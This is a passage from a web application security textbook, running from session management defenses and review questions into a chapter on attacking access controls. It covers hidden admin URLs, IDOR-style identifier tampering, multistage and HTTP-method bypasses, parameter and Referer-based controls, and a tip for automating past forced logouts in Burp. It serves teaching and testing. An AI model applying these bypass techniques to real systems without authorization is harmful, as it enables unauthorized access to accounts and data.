c07.indd 248 c07.indd 248 8/19/2011 12:07:44 PM 8/19/2011 12:07:44 PM
Stuttard c07.indd V3 - 07/22/2011 Page 249
 Chapter 7 n Attacking Session Management 249
signifi cantly. Some, like java.util.Random, are perfectly useful for many purposes where a source of changing input is required. But they can be extrapolated 
in both forward and reverse directions with perfect certainty on the basis of a 
single item of output. Developers should investigate the mathematical properties of the actual algorithms used within different available sources of randomness and should read relevant documentation about the recommended uses of 
different APIs. In general, if an algorithm is not explicitly described as being 
cryptographically secure, it should be assumed to be predictable.
NOTE Some high-strength sources of randomness take some time to return 
the next value in their output sequence because of the steps they take to 
obtain suffi cient entropy (such as from system events). Therefore, they may 
not deliver values fast enough to generate tokens for some high-volume 
applications.
In addition to selecting the most robust source of randomness that is feasible, 
a good practice is to introduce as a source of entropy some information about 
the individual request for which the token is being generated. This information may not be unique to that request, but it can be effective at mitigating any 
weaknesses in the core pseudorandom number generator being used. Here are 
some examples of information that may be incorporated:
n The source IP address and port number from which the request was received
n The User-Agent header in the request
n The time of the request in milliseconds
A highly effective formula for incorporating this entropy is to construct a 
string that concatenates a pseudorandom number, a variety of request-specifi c 
data as listed, and a secret string known only to the server and generated afresh 
on each reboot. A suitable hash is then taken of this string (using, for example, 
SHA-256 at the time of this writing) to produce a manageable fi xed-length string 
that can be used as a token. (Placing the most variable items toward the start of 
the hash‚Äôs input maximizes the ‚Äúavalanche‚Äù effect within the hashing algorithm.)
TIP Having chosen an algorithm for generating session tokens, a useful 
‚Äúthought experiment‚Äù is to imagine that your source of pseudorandomness 
is broken and always returns the same value. In this eventuality, would an 
attacker who obtains a large sample of tokens from the application be able to 
extrapolate tokens issued to other users? Using the formula described here, in 
general this is highly unlikely, even with full knowledge of the algorithm used. 
The source IP, port number, User-Agent header, and time of request together 
generate a vast amount of entropy. And even with full knowledge of these, the 
attacker will be unable to produce the corresponding token without knowing 
the secret string used by the server.
c07.indd 249 c07.indd 249 8/19/2011 12:07:44 PM 8/19/2011 12:07:44 PM
Stuttard c07.indd V3 - 07/22/2011 Page 250
250 Chapter 7 n Attacking Session Management
Protect Tokens Throughout Their Life Cycle
Now that you‚Äôve created a robust token whose value cannot be predicted, this 
token needs to be protected throughout its life cycle from creation to disposal, to 
ensure that it is not disclosed to anyone other than the user to whom it is issued:
n The token should only be transmitted over HTTPS. Any token transmitted in cleartext should be regarded as tainted ‚Äî that is, as not providing 
assurance of the user‚Äôs identity. If HTTP cookies are being used to transmit 
tokens, these should be fl agged as secure to prevent the user‚Äôs browser 
from ever transmitting them over HTTP. If feasible, HTTPS should be used 
for every page of the application, including static content such as help 
pages, images, and so on. If this is not desired and an HTTP service is still 
implemented, the application should redirect any requests for sensitive 
content (including the login page) to the HTTPS service. Static resources 
such as help pages usually are not sensitive and may be accessed without 
any authenticated session. Hence, the use of secure cookies can be backed 
up using cookie scope instructions to prevent tokens from being submitted in requests for these resources.
n Session tokens should never be transmitted in the URL, because this provides a simple vehicle for session fi xation attacks and results in tokens 
appearing in numerous logging mechanisms. In some cases, developers 
use this technique to implement sessions in browsers that have cookies 
disabled. However, a better means of achieving this is to use POST requests 
for all navigation and store tokens in a hidden fi eld of an HTML form.
n Logout functionality should be implemented. This should dispose of all 
session resources held on the server and invalidate the session token.
n Session expiration should be implemented after a suitable period of inactivity (such as 10 minutes). This should result in the same behavior as if 
the user had explicitly logged out.
n Concurrent logins should be prevented. Each time a user logs in, a different session token should be issued, and any existing session belonging to 
the user should be disposed of as if she had logged out from it. When this 
occurs, the old token may be stored for a period of time. Any subsequent 
requests received using the token should return a security alert to the 
user stating that the session has been terminated because she logged in 
from a different location.
n If the application contains any administrative or diagnostic functionality that enables session tokens to be viewed, this functionality should be 
robustly defended against unauthorized access. In most cases, there is no 
need for this functionality to display the actual session token. Rather, it 
should contain suffi cient details about the owner of the session for any 
c07.indd 250 c07.indd 250 8/19/2011 12:07:44 PM 8/19/2011 12:07:44 PM
Stuttard c07.indd V3 - 07/22/2011 Page 251
 Chapter 7 n Attacking Session Management 251
support and diagnostic tasks to be performed, without divulging the session token being submitted by the user to identify her session.
n The domain and path scope of an application‚Äôs session cookies should be 
set as restrictively as possible. Cookies with overly liberal scope are often 
generated by poorly confi gured web application platforms or web servers, rather than by the application developers themselves. No other web 
applications or untrusted functionality should be accessible via domain 
names or URL paths that are included within the scope of the application‚Äôs 
cookies. Particular attention should be paid to any existing subdomains 
to the domain name that is used to access the application. In some cases, 
to ensure that this vulnerability does not arise, it may be necessary to 
modify the domain- and path-naming scheme employed by the various 
applications in use within the organization.
Specifi c measures should be taken to defend the session management mechanism against the variety of attacks that the application‚Äôs users may fi nd themselves targets of:
n The application‚Äôs codebase should be rigorously audited to identify and 
remove any cross-site scripting vulnerabilities (see Chapter 12). Most such 
vulnerabilities can be exploited to attack session management mechanisms. 
In particular, stored (or second-order) XSS attacks can usually be exploited 
to defeat every conceivable defense against session misuse and hijacking.
n Arbitrary tokens submitted by users the server does not recognize should 
not be accepted. The token should be immediately canceled within the 
browser, and the user should be returned to the application‚Äôs start page.
n Cross-site request forgery and other session attacks can be made more diffi cult by requiring two-step confi rmation and/or reauthentication before 
critical actions such as funds transfers are carried out.
n Cross-site request forgery attacks can be defended against by not relying solely on HTTP cookies to transmit session tokens. Using the cookie 
mechanism introduces the vulnerability because cookies are automatically submitted by the browser regardless of what caused the request to 
take place. If tokens are always transmitted in a hidden fi eld of an HTML 
form, an attacker cannot create a form whose submission will cause an 
unauthorized action unless he already knows the token‚Äôs value. In this 
case he can simply perform an easy hijacking attack. Per-page tokens can 
also help prevent these attacks (see the following section).
n A fresh session should always be created after successful authentication, to 
mitigate the effects of session fi xation attacks. Where an application does 
not use authentication but does allow sensitive data to be submitted, the 
threat posed by fi xation attacks is harder to address. One possible approach 
c07.indd 251 c07.indd 251 8/19/2011 12:07:44 PM 8/19/2011 12:07:44 PM
Stuttard c07.indd V3 - 07/22/2011 Page 252
252 Chapter 7 n Attacking Session Management
is to keep the sequence of pages where sensitive data is submitted as short 
as possible. Then you can create a new session at the fi rst page of this 
sequence (where necessary, copying from the existing session any required 
data, such as the contents of a shopping cart). Or you could use per-page 
tokens (described in the following section) to prevent an attacker who 
knows the token used in the fi rst page from accessing subsequent pages. 
Except where strictly necessary, personal data should not be displayed 
back to the user. Even where this is required (such as a ‚Äúconfi rm order‚Äù 
page showing addresses), sensitive items such as credit card numbers and 
passwords should never be displayed back to the user and should always 
be masked within the source of the application‚Äôs response.
Per-Page Tokens
Finer-grained control over sessions can be achieved, and many kinds of session 
attacks can be made more diffi cult or impossible, by using per-page tokens in 
addition to session tokens. Here, a new page token is created every time a user 
requests an application page (as opposed to an image, for example) and is passed 
to the client in a cookie or a hidden fi eld of an HTML form. Each time the user 
makes a request, the page token is validated against the last value issued, in 
addition to the normal validation of the main session token. In the case of a 
non-match, the entire session is terminated. Many of the most security-critical 
web applications on the Internet, such as online banks, employ per-page tokens 
to provide increased protection for their session management mechanism, as 
shown in Figure 7-12.
Figure 7-12: Per-page tokens used in a banking application
The use of per-page tokens does impose some restrictions on navigation (for 
example, on use of the back and forward buttons and multiwindow browsing). 
c07.indd 252 c07.indd 252 8/19/2011 12:07:44 PM 8/19/2011 12:07:44 PM
Stuttard c07.indd V3 - 07/22/2011 Page 253
 Chapter 7 n Attacking Session Management 253
However, it effectively prevents session fi xation attacks and ensures that the 
simultaneous use of a hijacked session by a legitimate user and an attacker 
will quickly be blocked after both have made a single request. Per-page tokens 
can also be leveraged to track the user‚Äôs location and movement through the 
application. They also can be used to detect attempts to access functions out of 
a defi ned sequence, helping protect against certain access control defects (see 
Chapter 8).
Log, Monitor, and Alert
The application‚Äôs session management functionality should be closely integrated 
with its mechanisms for logging, monitoring, and alerting to provide suitable 
records of anomalous activity and to enable administrators to take defensive 
actions where necessary:
n The application should monitor requests that contain invalid tokens. 
Except in the most predictable cases, a successful attack that attempts 
to guess the tokens issued to other users typically involves issuing large 
numbers of requests containing invalid tokens, leaving a noticeable mark 
in the application‚Äôs logs.
n Brute-force attacks against session tokens are diffi cult to block altogether, 
because no particular user account or session can be disabled to stop the 
attack. One possible action is to block source IP addresses for an amount 
of time when a number of requests containing invalid tokens have been 
received. However, this may be ineffective when one user‚Äôs requests originate from multiple IP addresses (such as AOL users) or when multiple 
users‚Äô requests originate from the same IP address (such as users behind 
a proxy or fi rewall performing network address translation).
n Even if brute-force attacks against sessions cannot be effectively prevented 
in real time, keeping detailed logs and alerting administrators enables 
them to investigate the attack and take appropriate action where they can.
n Wherever possible, users should be alerted to anomalous events relating 
to their session, such as concurrent logins or apparent hijacking (detected 
using per-page tokens). Even though a compromise may already have 
occurred, this enables the user to check whether any unauthorized actions 
such as funds transfers have taken place.
Reactive Session Termination
The session management mechanism can be leveraged as a highly effective 
defense against many kinds of other attacks against the application. Some 
security-critical applications such as online banking are extremely aggressive in 
terminating a user‚Äôs session every time he or she submits an anomalous request. 
c07.indd 253 c07.indd 253 8/19/2011 12:07:45 PM 8/19/2011 12:07:45 PM
Stuttard c07.indd V3 - 07/22/2011 Page 254
254 Chapter 7 n Attacking Session Management
Examples are any request containing a modifi ed hidden HTML form fi eld or 
URL query string parameter, any request containing strings associated with 
SQL injection or cross-site scripting attacks, and any user input that normally 
would have been blocked by client-side checks such as length restrictions.
Of course, any actual vulnerabilities that may be exploited using such requests 
need to be addressed at the source. But forcing users to reauthenticate every 
time they submit an invalid request can slow down the process of probing the 
application for vulnerabilities by many orders of magnitude, even where automated techniques are employed. If residual vulnerabilities do still exist, they 
are far less likely to be discovered by anyone in the fi eld.
Where this kind of defense is implemented, it is also recommended that it 
can be easily switched off for testing purposes. If a legitimate penetration test 
of the application is slowed down in the same way as a real-world attacker, its 
effectiveness is dramatically reduced. Also, it is very likely that the presence 
of the mechanism will result in more vulnerabilities remaining in production 
code than if the mechanism were absent.
HACK STEPS
If the application you are attacking uses this kind of defensive measure, you 
may fi nd that probing the application for many kinds of common vulnerabilities is extremely time-consuming. The mind-numbing need to log in after each 
failed test and renavigate to the point of the application you were looking at 
would quickly cause you to give up.
In this situation, you can often use automation to tackle the problem. 
When using Burp Intruder to perform an attack, you can use the Obtain 
Cookie feature to perform a fresh login before sending each test case, and 
use the new session token (provided that the login is single-stage). When 
browsing and probing the application manually, you can use the extensibility 
features of Burp Proxy via the IBurpExtender interface. You can create an 
extension that detects when the application has performed a forced logout, 
automatically logs back in to the application, and returns the new session 
and page to the browser, optionally with a pop-up message to tell you what 
has occurred. Although this by no means removes the problem, in certain 
cases it can mitigate it substantially.
Summary
The session management mechanism provides a rich source of potential vulnerabilities for you to target when formulating your attack against an application. 
Because of its fundamental role in enabling the application to identify the same 
user across multiple requests, a broken session management function usually 
c07.indd 254 c07.indd 254 8/19/2011 12:07:45 PM 8/19/2011 12:07:45 PM
Stuttard c07.indd V3 - 07/22/2011 Page 255
 Chapter 7 n Attacking Session Management 255
provides the keys to the kingdom. Jumping into other users‚Äô sessions is good. 
Hijacking an administrator‚Äôs session is even better; typically this enables you 
to compromise the entire application.
You can expect to encounter a wide range of defects in real-world session 
management functionality. When bespoke mechanisms are employed, the 
possible weaknesses and avenues of attack may appear to be endless. The most 
important lesson to draw from this topic is to be patient and determined. Quite 
a few session management mechanisms that appear to be robust on fi rst inspection can be found wanting when analyzed closely. Deciphering the method an 
application uses to generate its sequence of seemingly random tokens may take 
time and ingenuity. But given the reward, this is usually an investment well 
worth making.
Questions
Answers can be found at http://mdsec.net/wahh.
 1. You log in to an application, and the server sets the following cookie:
Set-cookie: sessid=amltMjM6MTI0MToxMTk0ODcwODYz;
An hour later, you log in again and receive the following:
Set-cookie: sessid=amltMjM6MTI0MToxMTk0ODc1MTMy;
What can you deduce about these cookies?
 2. An application employs six-character alphanumeric session tokens and 
fi ve-character alphanumeric passwords. Both are randomly generated 
according to an unpredictable algorithm. Which of these is likely to be 
the more worthwhile target for a brute-force guessing attack? List all the 
different factors that may be relevant to your decision.
 3. You log in to an application at the following URL:
https://foo.wahh-app.com/login/home.php
and the server sets the following cookie:
Set-cookie: sessionId=1498172056438227; domain=foo.wahhapp.com; path=/login; HttpOnly;
You then visit a range of other URLs. To which of the following will your 
browser submit the sessionId cookie? (Select all that apply.)
 (a) https://foo.wahh-app.com/login/myaccount.php
 (b) https://bar.wahh-app.com/login
 (c) https://staging.foo.wahh-app.com/login/home.php
 (d) http://foo.wahh-app.com/login/myaccount.php
c07.indd 255 c07.indd 255 8/19/2011 12:07:45 PM 8/19/2011 12:07:45 PM
Stuttard c07.indd V3 - 07/22/2011 Page 256
256 Chapter 7 n Attacking Session Management
 (e) http://foo.wahh-app.com/logintest/login.php
 (f) https://foo.wahh-app.com/logout
 (g) https://wahh-app.com/login/
 (h) https://xfoo.wahh-app.com/login/myaccount.php
 4. The application you are targeting uses per-page tokens in addition to the 
primary session token. If a per-page token is received out of sequence, the 
entire session is invalidated. Suppose that you discover some defect that 
enables you to predict or capture the tokens issued to other users who are 
currently accessing the application. Can you hijack their sessions?
 5. You log in to an application, and the server sets the following cookie:
Set-cookie: sess=ab11298f7eg14;
When you click the logout button, this causes the following client-side 
script to execute:
document.cookie=‚Äùsess=‚Äù;
document.location=‚Äù/‚Äù;
What conclusion would you draw from this behavior?
c07.indd 256 c07.indd 256 8/19/2011 12:07:45 PM 8/19/2011 12:07:45 PM
Stuttard c08.indd V3 - 07/28/2011 Page 257
257
C H A P T E R 
8
Attacking Access Controls
Within the application‚Äôs core security mechanisms, access controls are logically 
built on authentication and session management. So far, you have seen how an 
application can fi rst verify a user‚Äôs identity and then confi rm that a particular 
sequence of requests that it receives originated from the same user. The primary 
reason that the application needs to do these things ‚Äî in terms of security, at 
least ‚Äî is because it needs a way to decide whether it should permit a given 
request to perform its attempted action or access the resources it is requesting. 
Access controls are a critical defense mechanism within the application because 
they are responsible for making these key decisions. When they are defective, an 
attacker can often compromise the entire application, taking control of administrative functionality and accessing sensitive data belonging to every other user.
As noted in Chapter 1, broken access controls are among the most commonly 
encountered categories of web application vulnerability, affecting a massive 71 
percent of the applications recently tested by the authors. It is extremely common to encounter applications that go to all the trouble of implementing robust 
mechanisms for authentication and session management, only to squander that 
investment by neglecting to build effective access controls on them. One reason 
that these weaknesses are so prevalent is that access control checks need to be 
performed for every request and every operation on a resource that particular 
user attempts to perform, at a specifi c time. And unlike many other classes of 
control, this is a design decision that needs to be made by a human; it cannot 
be resolved by employing technology.
c08.indd 257 c08.indd 257 8/19/2011 12:08:31 PM 8/19/2011 12:08:31 PM
Stuttard c08.indd V3 - 07/28/2011 Page 258
258 Chapter 8 n Attacking Access Controls
Access control vulnerabilities are conceptually simple: The application lets you 
do something you shouldn‚Äôt be able to. The differences between separate fl aws 
really come down to the different ways in which this core defect is manifested and 
the different techniques you need to employ to detect it. This chapter describes all 
these techniques, showing how you can exploit different kinds of behavior within 
an application to perform unauthorized actions and access protected data.
Common Vulnerabilities
Access controls can be divided into three broad categories: vertical, horizontal, 
and context-dependent.
Vertical access controls allow different types of users to access different parts 
of the application‚Äôs functionality. In the simplest case, this typically involves a 
division between ordinary users and administrators. In more complex cases, 
vertical access controls may involve fi ne-grained user roles granting access to 
specifi c functions, with each user being allocated to a single role, or a combination of different roles.
Horizontal access controls allow users to access a certain subset of a wider 
range of resources of the same type. For example, a web mail application may 
allow you to read your e-mail but no one else‚Äôs, an online bank may let you 
transfer money out of your account only, and a workfl ow application may allow 
you to update tasks assigned to you but only read tasks assigned to other people.
Context-dependent access controls ensure that users‚Äô access is restricted to 
what is permitted given the current application state. For example, if a user is 
following multiple stages within a process, context-dependent access controls 
may prevent the user from accessing stages out of the prescribed order.
In many cases, vertical and horizontal access controls are intertwined. For 
example, an enterprise resource planning application may allow each accounts 
payable clerk to pay invoices for a specifi c organizational unit and no other. The 
accounts payable manager, on the other hand, may be allowed to pay invoices 
for any unit. Similarly, clerks may be able to pay invoices for small amounts, 
but larger invoices must be paid by the manager. The fi nance director may be 
able to view invoice payments and receipts for every organizational unit in the 
company but may not be permitted to pay any invoices.
Access controls are broken if any user can access functionality or resources for 
which he or she is not authorized. There are three main types of attacks against 
access controls, corresponding to the three categories of controls:
n Vertical privilege escalation occurs when a user can perform functions 
that his assigned role does not permit him to. For example, if an ordinary 
user can perform administrative functions, or a clerk can pay invoices of 
any size, access controls are broken.
c08.indd 258 c08.indd 258 8/19/2011 12:08:31 PM 8/19/2011 12:08:31 PM
Stuttard c08.indd V3 - 07/28/2011 Page 259
 Chapter 8 n Attacking Access Controls 259
n Horizontal privilege escalation occurs when a user can view or modify 
resources to which he is not entitled. For example, if you can use a web 
mail application to read other people‚Äôs e-mail, or if a payment clerk can 
process invoices for an organizational unit other than his own, access 
controls are broken.
n Business logic exploitation occurs when a user can exploit a fl aw in the 
application‚Äôs state machine to gain access to a key resource. For example, 
a user may be able to bypass the payment step in a shopping checkout 
sequence.
It is common to fi nd cases where vulnerability in the application‚Äôs horizontal 
separation of privileges can lead immediately to a vertical escalation attack. For 
example, if a user fi nds a way to set a different user‚Äôs password, the user can 
attack an administrative account and take control of the application.
In the cases described so far, broken access controls enable users who have 
authenticated themselves to the application in a particular user context to perform actions or access data for which that context does not authorize them. 
However, in the most serious cases of broken access control, it may be possible 
for completely unauthorized users to gain access to functionality or data that 
is intended to be accessed only by privileged authenticated users.
Completely Unprotected Functionality
In many cases of broken access controls, sensitive functionality and resources 
can be accessed by anyone who knows the relevant URL. For example, with 
many applications, anyone who visits a specifi c URL can make full use of its 
administrative functions:
https://wahh-app.com/admin/
In this situation, the application typically enforces access control only to the 
following extent: users who have logged in as administrators see a link to this 
URL on their user interface, and other users do not. This cosmetic difference 
is the only mechanism in place to ‚Äúprotect‚Äù the sensitive functionality from 
unauthorized use.
Sometimes, the URL that grants access to powerful functions may be less 
easy to guess, and may even be quite cryptic:
https://wahh-app.com/menus/secure/ff457/DoAdminMenu2.jsp
Here, access to administrative functions is protected by the assumption that 
an attacker will not know or discover this URL. The application is harder for 
an outsider to compromise, because he is less likely to guess the URL by which 
he can do so.
c08.indd 259 c08.indd 259 8/19/2011 12:08:31 PM 8/19/2011 12:08:31 PM
Stuttard c08.indd V3 - 07/28/2011 Page 260
260 Chapter 8 n Attacking Access Controls
COMMON MYTH
‚ÄúNo low-privileged users will know that URL. We don‚Äôt reference it anywhere 
within the application.‚Äù
The absence of any genuine access control still constitutes a serious vulnerability, regardless of how easy it would be to guess the URL. URLs do not have 
the status of secrets, either within the application itself or in the hands of 
its users. They are displayed on-screen, and they appear in browser histories 
and the logs of web servers and proxy servers. Users may write them down, 
bookmark them, or e-mail them. They are not usually changed periodically, as 
passwords should be. When users change job roles, and their access to administrative functionality needs to be withdrawn, there is no way to delete their 
knowledge of a particular URL.
In some applications where sensitive functionality is hidden behind URLs 
that are not easy to guess, an attacker may often be able to identify these via 
close inspection of client-side code. Many applications use JavaScript to build 
the user interface dynamically within the client. This typically works by setting 
various fl ags regarding the user‚Äôs status and then adding individual elements 
to the UI on the basis of these:
var isAdmin = false;
...
if (isAdmin)
{
 adminMenu.addItem(‚Äú/menus/secure/ff457/addNewPortalUser2.jsp‚Äù,
 ‚Äúcreate a new user‚Äù);
}
Here, an attacker can simply review the JavaScript to identify URLs for 
administrative functionality and attempt to access these. In other cases, HTML 
comments may contain references to or clues about URLs that are not linked 
from on-screen content. Chapter 4 discusses the various techniques by which 
an attacker can gather information about hidden content within the application.
Direct Access to Methods
A specifi c case of unprotected functionality can arise when applications expose 
URLs or parameters that are actually remote invocations of API methods, normally 
those exposed by a Java interface. This often occurs when server-side code is 
moved to a browser extension component and method stubs are created so that 
the code can still call the server-side methods it requires to function. Outside 
of this situation, some instances of direct access to methods can be identifi ed 
where URLs or parameters use the standard Java naming conventions, such as 
getBalance and isExpired.
c08.indd 260 c08.indd 260 8/19/2011 12:08:31 PM 8/19/2011 12:08:31 PM
Stuttard c08.indd V3 - 07/28/2011 Page 261
 Chapter 8 n Attacking Access Controls 261
In principle, requests specifying a server-side API to be executed need be 
no less secure than those specifying a server-side script or other resource. In 
practice, however, this type of mechanism frequently contains vulnerabilities. 
Often, the client interacts directly with server-side API methods and bypasses 
the application‚Äôs normal controls over access or unexpected input vectors. There 
is also a chance that other functionality exists that can be invoked in this way 
and is not protected by any controls, on the assumption that it could never be 
directly invoked by web application clients. Often, there is a need to provide 
users with access to certain specifi c methods, but they are instead given access 
to all methods. This is either because the developer is not fully aware of which 
subset of methods to proxy and provides access to all methods, or because the API 
used to map them to the HTTP server provides access to all methods by default.
The following example shows the getCurrentUserRoles method being invoked 
from within the interface securityCheck:
http://wahh-app.com/public/securityCheck/getCurrentUserRoles
In this example, in addition to testing the access controls over the getCurrentUserRoles method, you should check for the existence of other similarly 
named methods such as getAllUserRoles, getAllRoles, getAllUsers, and 
getCurrentUserPermissions. Further considerations specifi c to the testing of 
direct access to methods are described later in this chapter.
Identifi er-Based Functions
When a function of an application is used to gain access to a specifi c resource, 
it is common to see an identifi er for the requested resource being passed to the 
server in a request parameter, within either the URL query string or the body 
of a POST request. For example, an application may use the following URL to 
display a specifi c document belonging to a particular user:
https://wahh-app.com/ViewDocument.php?docid=1280149120
When the user who owns the document is logged in, a link to this URL is 
displayed on the user‚Äôs My Documents page. Other users do not see the link. 
However, if access controls are broken, any user who requests the relevant URL 
may be able to view the document in exactly the same way as the authorized user.
TIP This type of vulnerability often arises when the main application interfaces with an external system or back-end component. It can be diffi cult to 
share a session-based security model between different systems that may be 
based on diverse technologies. Faced with this problem, developers frequently 
take a shortcut and move away from that model, using client-submitted 
parameters to make access control decisions.
c08.indd 261 c08.indd 261 8/19/2011 12:08:31 PM 8/19/2011 12:08:31 PM
Stuttard c08.indd V3 - 07/28/2011 Page 262
262 Chapter 8 n Attacking Access Controls
In this example, an attacker seeking to gain unauthorized access needs to 
know not only the name of the application page (ViewDocument.php) but also 
the identifi er of the document he wants to view. Sometimes, resource identifi ers are generated in a highly unpredictable manner; for example, they may 
be randomly chosen GUIDs. In other cases, they may be easily guessed; for 
example, they may be sequentially generated numbers. However, the application is vulnerable in both cases. As described previously, URLs do not have the 
status of secrets, and the same applies to resource identifi ers. Often, an attacker 
who wants to discover the identifi ers of other users‚Äô resources can fi nd some 
location within the application that discloses these, such as access logs. Even 
where an application‚Äôs resource identifi ers cannot be easily guessed, the application is still vulnerable if it fails to properly control access to those resources. 
In cases where the identifi ers are easily predicted, the problem is even more 
serious and more easily exploited.
TIP Application logs are often a gold mine of information. They may contain 
numerous items of data that can be used as identifi ers to probe functionality 
that is accessed in this way. Identifi ers commonly found within application 
logs include usernames, user ID numbers, account numbers, document IDs, 
user groups and roles, and e-mail addresses.
NOTE In addition to being used as references to data-based resources within 
the application, this kind of identifi er is often used to refer to functions of the 
application itself. As you saw in Chapter 4, an application may deliver different functions via a single page, which accepts a function name or identifi er as 
a parameter. Again in this situation, access controls may run no deeper than 
the presence or absence of specifi c URLs within the interfaces of different 
types of users. If an attacker can determine the identifi er for a sensitive function, he may be able to access it in the same way as a more privileged user.
Multistage Functions
Many kinds of functions within an application are implemented across several 
stages, involving multiple requests being sent from the client to the server. For 
example, a function to add a new user may involve choosing this option from 
a user maintenance menu, selecting the department and user role from dropdown lists, and then entering the new username, initial password, and other 
information.
It is common to encounter applications in which efforts have been made to 
protect this kind of sensitive functionality from unauthorized access but where 
the access controls employed are broken because of fl awed assumptions about 
how the functionality will be used.
c08.indd 262 c08.indd 262 8/19/2011 12:08:31 PM 8/19/2011 12:08:31 PM
Stuttard c08.indd V3 - 07/28/2011 Page 263
 Chapter 8 n Attacking Access Controls 263
In the previous example, when a user attempts to load the user maintenance 
menu and chooses the option to add a new user, the application may verify 
that the user has the required privileges and block access if the user does not. 
However, if an attacker proceeds directly to the stage of specifying the user‚Äôs 
department and other details, there may be no effective access control. The 
developers unconsciously assumed that any user who reaches the later stages 
of the process must have the relevant privileges because this was verifi ed at 
the earlier stages. The result is that any user of the application can add a new 
administrative user account and thereby take full control of the application, gaining access to many other functions whose access control is intrinsically robust.
The authors have encountered this type of vulnerability even in the most 
security-critical web applications ‚Äî those deployed by online banks. Making a 
funds transfer in a banking application typically involves multiple stages, partly 
to prevent users from accidentally making mistakes when requesting a transfer. 
This multistage process involves capturing different items of data from the user 
at each stage. This data is checked thoroughly when fi rst submitted and then 
usually is passed to each subsequent stage, using hidden fi elds in HTML form. 
However, if the application does not revalidate all this data at the fi nal stage, 
an attacker can potentially bypass the server‚Äôs checks. For example, the application might verify that the source account selected for the transfer belongs to 
the current user and then ask for details about the destination account and the 
amount of the transfer. If a user intercepts the fi nal POST request of this process 
and modifi es the source account number, she can execute a horizontal privilege 
escalation and transfer funds out of an account belonging to a different user.
Static Files
In the majority of cases, users gain access to protected functionality and resources 
by issuing requests to dynamic pages that execute on the server. It is the responsibility of each such page to perform suitable access control checks and confi rm that 
the user has the relevant privileges to perform the action he or she is attempting.
However, in some cases, requests for protected resources are made directly to 
the static resources themselves, which are located within the server‚Äôs web root. 
For example, an online publisher may allow users to browse its book catalog 
and purchase ebooks for download. Once payment has been made, the user is 
directed to a download URL like the following:
https://wahh-books.com/download/9780636628104.pdf
Because this is a completely static resource, if it is hosted on a traditional web 
server, its contents are simply returned directly by the server, and no applicationlevel code is executed. Hence, the resource cannot implement any logic to verify 
c08.indd 263 c08.indd 263 8/19/2011 12:08:31 PM 8/19/2011 12:08:31 PM
Stuttard c08.indd V3 - 07/28/2011 Page 264
264 Chapter 8 n Attacking Access Controls
that the requesting user has the required privileges. When static resources are 
accessed in this way, it is highly likely that no effective access controls are protecting them and that anyone who knows the URL naming scheme can exploit 
this to access any resources he wants. In the present case, the document name 
looks suspiciously like an ISBN, which would enable an attacker to quickly 
download every ebook produced by the publisher!
Certain types of functionality are particularly prone to this kind of problem, including fi nancial websites providing access to static documents about 
companies such as annual reports, software vendors that provide downloadable 
binaries, and administrative functionality that provides access to static log fi les 
and other sensitive data collected within the application.
Platform Misconfi guration
Some applications use controls at the web server or application platform layer 
to control access. Typically, access to specifi ed URL paths is restricted based on 
the user‚Äôs role within the application. For example, access to the /admin path 
may be denied to users who are not in the Administrators group. In principle, 
this is an entirely legitimate means of controlling access. However, mistakes 
made in the confi guration of the platform-level controls can often allow unauthorized access to occur.
The platform-level confi guration normally takes the form of rules that are 
akin to fi rewall policy rules, which allow or deny access based on the following:
n HTTP request method
n URL path
n User role
As described in Chapter 3, the original purpose of the GET method is of retrieving information, and the purpose of the POST method is performing actions that 
change the application‚Äôs data or state.
If care is not taken to devise rules that accurately allow access based on the 
correct HTTP methods and URL paths, this may lead to unauthorized access. 
For example, if an administrative function to create a new user uses the POST
method, the platform may have a deny rule that disallows the POST method 
and allows all other methods. However, if the application-level code does not 
verify that all requests for this function are in fact using the POST method, an 
attacker may be able to circumvent the control by submitting the same request 
using the GET method. Since most application-level APIs for retrieving request 
parameters are agnostic as to the request method, the attacker can simply supply the required parameters within the URL query string of the GET request to 
make unauthorized use of the function.
c08.indd 264 c08.indd 264 8/19/2011 12:08:31 PM 8/19/2011 12:08:31 PM
Stuttard c08.indd V3 - 07/28/2011 Page 265
 Chapter 8 n Attacking Access Controls 265
What is more surprising, on the face of it, is that applications can still be 
vulnerable even if the platform-level rule denies access to both the GET and 
POST methods. This happens because requests using other HTTP methods may 
ultimately be handled by the same application code that handles GET and POST
requests. One example of this is the HEAD method. According to specifi cations, 
servers should respond to a HEAD request with the same headers they would use 
to respond to the corresponding GET request, but with no message body. Hence, 
most platforms correctly service HEAD requests by executing the corresponding 
GET handler and just return the HTTP headers that are generated. GET requests 
can often be used to perform sensitive actions, either because the application 
itself uses GET requests for this purpose (contrary to specifi cations) or because 
it does not verify that the POST method is being used. If an attacker can use a 
HEAD request to add an administrative user account, he or she can live without 
receiving any message body in the response.
In some cases, platforms handle requests that use unrecognized HTTP methods 
by simply passing them to the GET request handler. In this situation, platformlevel controls that just deny certain specifi ed HTTP methods can be bypassed 
by specifying an arbitrary invalid HTTP method in the request.
Chapter 18 contains a specifi c example of this type of vulnerability arising 
in a web application platform product.
Insecure Access Control Methods
Some applications employ a fundamentally insecure access control model in 
which access control decisions are made on the basis of request parameters 
submitted by the client, or other conditions that are within an attacker‚Äôs control.
Parameter-Based Access Control
In some versions of this model, the application determines a user‚Äôs role or access 
level at the time of login and from this point onward transmits this information 
via the client in a hidden form fi eld, cookie, or preset query string parameter (see 
Chapter 5). When each subsequent request is processed, the application reads 
this request parameter and decides what access to grant the user accordingly.
For example, an administrator using the application may see URLs like the 
following:
https://wahh-app.com/login/home.jsp?admin=true
The URLs seen by ordinary users contain a different parameter, or none at all. 
Any user who is aware of the parameter assigned to administrators can simply 
set it in his own requests and thereby gain access to administrative functions.
c08.indd 265 c08.indd 265 8/19/2011 12:08:31 PM 8/19/2011 12:08:31 PM
Stuttard c08.indd V3 - 07/28/2011 Page 266
266 Chapter 8 n Attacking Access Controls
This type of access control may sometimes be diffi cult to detect without 
actually using the application as a high-privileged user and identifying what 
requests are made. The techniques described in Chapter 4 for discovering hidden request parameters may be successful in discovering the mechanism when 
working only as an ordinary user.
Referer-Based Access Control
In other unsafe access control models, the application uses the HTTP Referer
header as the basis for making access control decisions. For example, an application may strictly control access to the main administrative menu based on 
a user‚Äôs privileges. But when a user makes a request for an individual administrative function, the application may simply check whether this request was 
referred from the administrative menu page. It might assume that the user must 
have accessed that page and therefore has the required privileges. This model 
is fundamentally broken, of course, because the Referer header is completely 
under the user‚Äôs control and can be set to any value.
Location-Based Access Control
Many businesses have a regulatory or business requirement to restrict access to 
resources depending on the user‚Äôs geographic location. These are not limited 
to the fi nancial sector but include news services and others. In these situations, 
a company may employ various methods to locate the user, the most common 
of which is geolocation of the user‚Äôs current IP address.
